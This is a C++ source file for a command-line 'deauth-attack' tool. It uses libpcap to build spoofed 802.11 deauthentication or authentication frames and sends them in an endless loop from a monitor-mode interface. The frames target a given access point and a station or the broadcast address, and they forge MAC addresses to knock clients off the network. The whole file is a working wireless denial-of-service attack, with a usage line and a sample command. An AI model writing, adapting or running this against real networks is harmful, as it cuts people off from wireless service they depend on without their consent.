#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <iostream>
#include "mac.h"

using namespace std;

struct ieee80211_radiotap_header {
    uint8_t        it_version;     /* set to 0 */
    uint8_t        it_pad;
    uint16_t       it_len;         /* entire length */
    u_int32_t       it_present;     /* fields present */
}__attribute__((__packed__));
typedef ieee80211_radiotap_header rthdr;

struct not_rtap {
	uint16_t it_ver_pad;
	uint16_t it_len;
	uint8_t it_dum[4];
}__attribute__((__packed__));
typedef not_rtap Rtap;

typedef struct beacon {
	uint16_t frame_control;
	uint16_t duration;
	Mac dmac;
	Mac smac;
	Mac bss;
	uint16_t seq;
	uint16_t fixed_param[3];
} Beacon;

pcap_t* pcap;

void usage() {
	cout << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
	cout << "sample : deauth-attack mon0 01:23:45:67:89:ab 13:37:13:37:13:37\n";
}

int attack(Mac target, Mac ap, int isauth, int rev) {
	int pkt_size = sizeof(Rtap) + sizeof(Beacon);
	uint8_t* pkt = (uint8_t*)malloc(pkt_size);
	memset(pkt, 0, pkt_size);
	Rtap* rtap = (Rtap*)pkt;
    Beacon* beacon = (Beacon*)(pkt + sizeof(Rtap));
    rtap -> it_len = sizeof(Rtap);
    beacon -> dmac = target;
    beacon -> smac = ap;
    beacon -> bss = ap;
    if(isauth == 0) {
		beacon -> frame_control = 0xc0;
		beacon -> fixed_param[0] = 0x07;
	    pkt_size -= 4;
	} else {
		beacon -> frame_control = 0xb0;
		beacon -> fixed_param[1] = 0x02;
	}

	while(true) {
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(pkt), pkt_size);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			return -1;
		}
		if(rev) {
			beacon -> dmac = ap;
			beacon -> smac = target;
			res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(pkt), pkt_size);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
				return -1;
			}
			beacon -> dmac = target;
			beacon -> smac = ap;
		}
		usleep(10000);
	}
}

int main(int argc, char* argv[]) {
	char *dev = argv[1];
	Mac ap = Mac(string(argv[2]));
	int rev = 0;
	int isauth = 0;
	Mac station;

	if(argc < 2 || argc > 5) {
		usage();
		return 0;
	}

	if(argc < 4) {
		station = Mac::broadcastMac();
	} else {
		rev = 1;
		station = Mac(string(argv[3]));
	}
	if(argc == 5) {
		if(strcmp(argv[4], "-auth") == 0) {
			isauth = 1;
		} else {
			usage();
			return 0;
		}
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}
	attack(station, ap, isauth, rev);
}

